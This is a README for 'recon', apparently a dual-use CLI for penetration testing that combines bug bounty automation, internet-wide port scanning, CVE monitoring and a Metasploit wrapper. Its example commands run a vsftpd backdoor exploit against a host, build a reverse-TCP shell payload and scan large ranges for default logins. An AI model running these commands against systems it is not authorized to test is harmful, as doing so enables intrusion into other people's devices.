# Recon Platform

Unified security research CLI for bug bounty automation, internet-wide device discovery, targeted engagement, CVE monitoring, and Metasploit integration.

## Quick Start

```bash
chmod +x recon
./recon help
./recon test          # run unit + smoke tests
```

Config is created at `~/.config/recon/config.yaml`. Data lives in `~/.local/share/recon/`.

## Modes

### `recon bounty` — HackerOne automation

```bash
recon bounty sync
recon bounty scan <program> [--mode active|passive|hybrid]
recon bounty scan-target <program> <target>
recon bounty continuous
recon bounty findings
recon bounty report [program] [html|json]
```

Legacy: `bugbountybot.sh` and bare commands (`recon sync`, `recon scan`) still work.

### `recon hunt` — Internet-wide active scanning

Requires explicit authorization. Only scan networks you own or have written permission to test.

```bash
recon hunt start --input ranges.txt --ports 22,80,443 --rate 10000 --authorized
recon hunt results --min-risk 70
recon hunt export json
recon hunt continuous --input ranges.txt --interval 86400
```

Pipeline: zmap/masscan → nmap fingerprint → nuclei IoT/default-login checks → risk scoring → SQLite.

### `recon target` — Single device engagement

```bash
recon target 192.168.1.50
recon target router.local --deep --exploit
recon target 10.0.0.5 --output ./scan_out
```

Stages: port scan → service enum → vuln plugins → TLS → CVE correlation → exploit suggestions (with `--exploit`).

### `recon cve` — CVE feed monitoring

```bash
recon cve sync
recon cve list --kev --since 24h
recon cve show CVE-2024-0001
recon cve watch --interval 3600
recon cve match
```

Sources: NVD API 2.0 (primary), CIRCL fallback, cvemap/searchsploit enrichment.

### `recon msf` — Metasploit wrapper

```bash
recon msf doctor
recon msf search vsftpd
recon msf search --cve CVE-2021-44228
recon msf run exploit/linux/ftp/vsftpd_234_backdoor --rhost 1.2.3.4 --lhost 10.0.0.1
recon msf payload linux/x64/shell_reverse_tcp --lhost 10.0.0.1 --lport 4444
recon msf sessions list
recon msf suggest --target 1.2.3.4
```

### `recon tui` — Legacy interactive menus

```bash
recon tui recon   # vul.sh TUI
recon tui vuln    # turret.sh TUI
```

## Architecture

```
recon                 # main entry
lib/                  # shared library (config, db, plugins, msf, correlation)
lib/modes/            # bounty, hunt, target, cve, msf, tui
plugins/recon|vuln|hunt/
data/banners/         # firmware/service fingerprint patterns
```

## Dependencies

Core: `bash`, `sqlite3`, `curl`, `jq`, `yq` (optional)

Mode-specific: `zmap`, `masscan`, `naabu`, `nmap`, `nuclei`, `httpx`, `whatweb`, `testssl`, `cvemap`, `msfconsole`, `msfvenom`, `searchsploit`

## Legal Notice

Active scanning (`recon hunt`) requires the `--authorized` flag. You are responsible for ensuring you have permission to scan any target network. Private/bogon ranges are excluded by default.
